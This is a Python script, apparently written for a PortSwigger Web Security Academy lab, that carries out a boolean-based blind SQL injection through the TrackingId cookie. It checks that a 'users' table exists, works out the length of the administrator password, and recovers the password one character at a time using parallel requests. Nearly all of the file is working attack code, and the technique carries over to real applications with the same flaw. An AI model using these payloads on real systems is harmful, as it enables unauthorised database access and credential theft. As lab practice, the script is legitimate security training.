#!/usr/bin/python3

import requests
import string
import datetime
import time
from multiprocessing import Pool

password = []
uppercase_letters = list(string.ascii_lowercase)
lowercase_letters = list(string.ascii_uppercase)
numbers = list(string.digits)

library = uppercase_letters + lowercase_letters + numbers
session = 'HVrfnLpLPmPYkzcKZJY529EiCVmf3DaU'
trackingId = 'DezMe1twrE4HPk35'
endpoint = "https://0a21000603f46180c014296d001b0062.web-security-academy.net"
length_of_password = 20

check_string = 'Welcome back!'

all_combinations = []

for i in range (1, length_of_password+1):
    for j in library:
        all_combinations.append([i, j])

def verify_user_table():
    time.sleep(0.5)
    payload = f"{trackingId}' AND (SELECT table_name from information_schema.tables where table_name='users') = 'users" # AND condition blindsqli, need valid trackingId
    cookies = {"TrackingId" : payload, "session": session}
    r = requests.get(endpoint,cookies=cookies)
    if check_string in r.text:
        print (f"[+] \'users\' table exists")

def get_password(pair):
    time.sleep(0.5)
    payload = f"{trackingId}' and substring((select password from users where username = 'administrator'), {pair[0]}, 1) = '{pair[1]}" # AND condition blindsqli, need valid trackingId
    cookies = {"TrackingId" : payload, "session": session}
    r = requests.get(endpoint,cookies=cookies)
    if check_string in r.text:
        print (f"[+] Found character {pair[1]} for position {pair[0]} for password")

def find_length_of_password(num):
    time.sleep(0.5)
    payload = f"asd' OR (SELECT username from users where username='administrator' and length(password) = {num}) = 'administrator" # OR condition blindsqli
    cookies = {"TrackingId" : payload, "session": session}
    r = requests.get(endpoint,cookies=cookies)
    if check_string in r.text:
        print(f"SUCCESS - {num}")

# https://stackoverflow.com/questions/18204782/runtimeerror-on-windows-trying-python-multiprocessing

if __name__ == '__main__':
    with Pool(20) as mp_pool:
        verify_user_table()
        #mp_pool.map(find_length_of_password, [i for i in range(35)])
        #mp_pool.map(get_password, all_combinations)
